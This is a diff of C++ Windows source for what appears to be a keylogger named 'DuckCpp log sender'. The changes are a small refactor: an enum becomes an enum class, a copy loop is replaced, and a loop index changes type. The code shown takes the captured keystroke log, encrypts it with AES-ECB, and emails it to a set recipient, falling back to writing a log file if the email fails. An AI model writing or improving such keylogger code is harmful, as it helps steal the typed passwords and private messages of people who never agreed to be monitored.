@@ -20,7 +20,7 @@
 typedef std::basic_string<TCHAR, std::char_traits<TCHAR>, std::allocator<TCHAR> > tstring;
 using std::string;
 using std::vector;
-enum workMode {
+enum class WorkMode {
 	sendLogEmail,
 	writeLogFile
 };
@@ -50,7 +50,7 @@ MSG msg;
 string header = "To: " + repicient + "\r\n" +
 "From: " + login + " (DuckCpp log sender)\r\n" +
 "Subject: Log\r\n\r\n";
-workMode mode = trySendEmail ? sendLogEmail : writeLogFile;
+WorkMode mode = trySendEmail ? WorkMode::sendLogEmail : WorkMode::writeLogFile;
 struct curl_slist* recipients = NULL;
 vector<unsigned char> key;
 AES aes(256);
@@ -169,21 +169,17 @@ void processLog()
 		return;
 	if (encryptLogs)
 	{
-		vector<unsigned char> input(keyLog.size());
-
-		for (int i = 0; i < keyLog.size(); ++i)
-			input[i] = keyLog[i];
-		
+		vector<unsigned char> input(keyLog.begin(), keyLog.end());
 		unsigned int encryptedLength;
 		unsigned char* encrypted = aes.EncryptECB(&input[0], keyLog.size(), &key[0], encryptedLength);
 		keyLog = bytesToHex(encrypted, encryptedLength) + "\nENDBLOCK\n";
 	}
-	if (mode == sendLogEmail)
+	if (mode == WorkMode::sendLogEmail)
 	{
 		if (!sendMail())
-			mode = writeLogFile; //Fail sending mail; will write to file
+			mode = WorkMode::writeLogFile; //Fail sending mail; will write to file
 	}
-	if (mode == writeLogFile)
+	if (mode == WorkMode::writeLogFile)
 	{
 		DWORD numberOfBytesWritten;
 		WriteFile(logFileHandle, keyLog.c_str(), keyLog.length(), &numberOfBytesWritten, NULL);
@@ -263,7 +259,7 @@ inline char hexDigit(unsigned a)
 string bytesToHex(unsigned char * data, int length)
 {
 	string r(length * 2, '\0');
-	for (unsigned i = 0; i < length; ++i) {
+	for (int i = 0; i < length; ++i) {
 		r[i * 2] = hexDigit(data[i] >> 4);
 		r[i * 2 + 1] = hexDigit(data[i] & 15);
 	}
